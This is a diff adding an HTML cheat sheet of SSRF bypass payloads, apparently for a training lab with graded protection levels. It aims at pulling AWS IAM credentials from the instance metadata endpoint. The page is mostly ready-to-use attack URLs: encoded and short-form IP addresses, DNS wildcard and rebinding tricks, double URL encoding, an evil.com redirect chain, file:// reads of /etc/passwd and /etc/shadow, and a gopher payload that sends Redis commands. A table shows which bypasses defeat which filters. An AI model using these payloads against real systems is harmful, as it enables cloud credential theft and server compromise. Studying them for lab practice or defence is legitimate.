@@ -1,0 +1,365 @@
+<!-- This should be in the Apache directory: /var/www/html/ -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Bypass Cheat Sheet</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #2d2d2d;
+            padding: 30px;
+            border-radius: 10px;
+        }
+
+        h1 {
+            color: #4ec9b0;
+            border-bottom: 3px solid #4ec9b0;
+            padding-bottom: 10px;
+            margin-bottom: 30px;
+        }
+
+        h2 {
+            color: #4ec9b0;
+            border-bottom: 2px solid #4ec9b0;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+
+        h3 {
+            color: #dcdcaa;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        .bypass {
+            background: #3c3c3c;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #569cd6;
+            border-radius: 4px;
+        }
+
+        .bypass-title {
+            color: #dcdcaa;
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        code {
+            background: #1e1e1e;
+            padding: 3px 8px;
+            border-radius: 3px;
+            color: #ce9178;
+            font-size: 14px;
+        }
+
+        .calculation {
+            background: #252526;
+            padding: 10px;
+            margin: 10px 0;
+            border-left: 3px solid #858585;
+            font-size: 13px;
+        }
+
+        .level-tag {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .tag-none { background: #ff5252; color: white; }
+        .tag-medium { background: #ffa726; color: white; }
+        .tag-high { background: #66bb6a; color: white; }
+        .tag-impossible { background: #7e57c2; color: white; }
+
+        .target {
+            background: #1e3a1e;
+            padding: 8px 12px;
+            margin: 5px 0;
+            border-radius: 3px;
+            color: #4ec9b0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #444;
+        }
+
+        th {
+            background: #1e1e1e;
+            color: #4ec9b0;
+            font-weight: bold;
+        }
+
+        tr:nth-child(even) {
+            background: #252526;
+        }
+
+        .works { color: #4ec9b0; }
+        .blocked { color: #f44336; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 SSRF Bypass Techniques Cheat Sheet</h1>
+        <p>Reference guide for Server-Side Request Forgery bypass methods</p>
+
+        <h2>📋 Target Information</h2>
+        <div class="target">
+            <strong>Primary Target:</strong> AWS IMDS<br>
+            <strong>IP:</strong> 169.254.169.254<br>
+            <strong>Critical Endpoint:</strong> /latest/meta-data/iam/security-credentials/WebServerRole<br>
+            <strong>Objective:</strong> Extract AWS credentials (AccessKeyId, SecretAccessKey, Token)
+        </div>
+
+        <h2>🎯 IP Format Bypasses</h2>
+
+        <div class="bypass">
+            <div class="bypass-title">1. Decimal IP Format <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://2852039166/latest/meta-data/iam/security-credentials/WebServerRole</code>
+            <div class="calculation">
+                <strong>Calculation:</strong><br>
+                169 × 256³ + 254 × 256² + 169 × 256 + 254 = 2,852,039,166<br>
+                <br>
+                <strong>For localhost (127.0.0.1):</strong><br>
+                127 × 256³ + 0 × 256² + 0 × 256 + 1 = 2,130,706,433
+            </div>
+        </div>
+
+        <div class="bypass">
+            <div class="bypass-title">2. Hexadecimal IP Format <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://0xa9fea9fe/latest/meta-data/iam/security-credentials/WebServerRole</code><br>
+            <code>http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/...</code> (dotted notation)
+            <div class="calculation">
+                <strong>Calculation:</strong><br>
+                169 = 0xa9<br>
+                254 = 0xfe<br>
+                169.254.169.254 = 0xa9fea9fe<br>
+                <br>
+                <strong>For localhost:</strong><br>
+                127.0.0.1 = 0x7f000001
+            </div>
+        </div>
+
+        <div class="bypass">
+            <div class="bypass-title">3. Octal IP Format <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://0251.0376.0251.0376/latest/meta-data/...</code>
+            <div class="calculation">
+                <strong>Calculation:</strong><br>
+                169 (decimal) = 251 (octal) = 0251<br>
+                254 (decimal) = 376 (octal) = 0376<br>
+                <br>
+                <strong>For localhost:</strong><br>
+                127.0.0.1 = 0177.0000.0000.0001
+            </div>
+        </div>
+
+        <div class="bypass">
+            <div class="bypass-title">4. Short Form IP <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://127.1:8080/</code> (expands to 127.0.0.1)<br>
+            <code>http://127.0.1:8080/</code> (missing one octet)<br>
+            <code>http://0:8080/</code> (expands to 0.0.0.0)
+        </div>
+
+        <div class="bypass">
+            <div class="bypass-title">5. IPv4-Mapped IPv6 <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://[::ffff:169.254.169.254]/latest/meta-data/...</code><br>
+            <code>http://[::ffff:127.0.0.1]:8080/</code>
+        </div>
+
+        <h2>🌐 DNS-Based Bypasses</h2>
+
+        <div class="bypass">
+            <div class="bypass-title">6. DNS Wildcard Services <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://169.254.169.254.nip.io/latest/meta-data/...</code><br>
+            <code>http://127.0.0.1.nip.io:8080/</code><br>
+            <code>http://metadata.169.254.169.254.xip.io/...</code>
+            <div class="calculation">
+                <strong>Note:</strong> nip.io and xip.io resolve to the IP in the subdomain
+            </div>
+        </div>
+
+        <div class="bypass">
+            <div class="bypass-title">7. DNS Rebinding <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span> <span class="level-tag tag-high">HIGH</span></div>
+            <code>http://rebind.network/attack</code>
+            <div class="calculation">
+                <strong>Advanced:</strong> DNS changes between validation check and actual fetch
+            </div>
+        </div>
+
+        <h2>📝 Encoding Bypasses</h2>
+
+        <div class="bypass">
+            <div class="bypass-title">8. URL Encoding (Path) <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://169.254.169.254/%6c%61%74%65%73%74/meta-data/...</code>
+            <div class="calculation">
+                "latest" = %6c%61%74%65%73%74<br>
+                "metadata" = %6d%65%74%61%64%61%74%61
+            </div>
+        </div>
+
+        <div class="bypass">
+            <div class="bypass-title">9. Double Encoding <span class="level-tag tag-none">NONE</span></div>
+            <code>http://169.254.169.254/%256c%2561%2574%2565%2573%2574/...</code>
+            <div class="calculation">
+                Double encoded "latest"
+            </div>
+        </div>
+
+        <h2>🔄 Redirect-Based Bypasses</h2>
+
+        <div class="bypass">
+            <div class="bypass-title">10. Open Redirect Chain <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>http://evil.com/redirect.php?url=http://169.254.169.254/...</code>
+            <div class="calculation">
+                <strong>Requires:</strong> External server that redirects<br>
+                <strong>Works if:</strong> Application follows redirects
+            </div>
+        </div>
+
+        <h2>📂 Protocol Bypasses</h2>
+
+        <div class="bypass">
+            <div class="bypass-title">11. File Protocol <span class="level-tag tag-none">NONE</span> <span class="level-tag tag-medium">MEDIUM</span></div>
+            <code>file:///etc/passwd</code><br>
+            <code>file:///etc/shadow</code><br>
+            <code>file:///var/www/html/ssrf_multilevel.php</code> (source code)
+        </div>
+
+        <div class="bypass">
+            <div class="bypass-title">12. Gopher Protocol <span class="level-tag tag-none">NONE</span></div>
+            <code>gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html</code>
+            <div class="calculation">
+                <strong>Advanced:</strong> Can send arbitrary TCP packets to services like Redis
+            </div>
+        </div>
+
+        <h2>📊 Bypass Effectiveness by Protection Level</h2>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Bypass Technique</th>
+                    <th>NONE</th>
+                    <th>MEDIUM</th>
+                    <th>HIGH</th>
+                    <th>IMPOSSIBLE</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Direct IP (169.254.169.254)</td>
+                    <td class="works">✅</td>
+                    <td class="blocked">❌</td>
+                    <td class="blocked">❌</td>
+                    <td class="blocked">❌</td>
+                </tr>
+                <tr>
+                    <td>Decimal IP (2852039166)</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="blocked">❌</td>
+                    <td class="blocked">❌</td>
+                </tr>
+                <tr>
+                    <td>Hexadecimal IP (0xa9fea9fe)</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="blocked">❌</td>
+                    <td class="blocked">❌</td>
+                </tr>
+                <tr>
+                    <td>Octal IP (0251.0376...)</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="blocked">❌</td>
+                    <td class="blocked">❌</td>
+                </tr>
+                <tr>
+                    <td>Short Form (127.1)</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="blocked">❌</td>
+                    <td class="blocked">❌</td>
+                </tr>
+                <tr>
+                    <td>file:// Protocol</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="blocked">❌</td>
+                    <td class="blocked">❌</td>
+                </tr>
+                <tr>
+                    <td>External URLs (google.com)</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="blocked">❌</td>
+                </tr>
+                <tr>
+                    <td>Whitelisted (httpbin.org)</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                    <td class="works">✅</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2>🎯 Quick Reference - Common Targets</h2>
+
+        <h3>AWS IMDS (169.254.169.254)</h3>
+        <code>Decimal: 2852039166</code><br>
+        <code>Hex: 0xa9fea9fe</code><br>
+        <code>Octal: 0251.0376.0251.0376</code>
+
+        <h3>Localhost (127.0.0.1)</h3>
+        <code>Decimal: 2130706433</code><br>
+        <code>Hex: 0x7f000001</code><br>
+        <code>Octal: 0177.0000.0000.0001</code><br>
+        <code>Short: 127.1 or 127.0.1</code>
+
+        <h3>0.0.0.0 (Bind all)</h3>
+        <code>Decimal: 0</code><br>
+        <code>Short: 0</code>
+
+        <h2>🔧 Python Calculator</h2>
+        <div class="calculation">
+            <strong>IP to Decimal:</strong><br>
+            <code>import socket; socket.inet_aton('169.254.169.254').hex()</code><br>
+            <code>int.from_bytes(socket.inet_aton('169.254.169.254'), 'big')</code><br>
+            <br>
+            <strong>Decimal to IP:</strong><br>
+            <code>import socket; socket.inet_ntoa(bytes.fromhex(hex(2852039166)[2:]))</code>
+        </div>
+
+        <h2>⚠️ Disclaimer</h2>
+        <p style="color: #f44336; background: #3c3c3c; padding: 15px; border-radius: 5px;">
+            This cheat sheet is for <strong>EDUCATIONAL PURPOSES ONLY</strong> and should only be used in authorized penetration testing scenarios or on systems you own. Unauthorized access to computer systems is illegal.
+        </p>
+    </div>
+</body>
+</html>
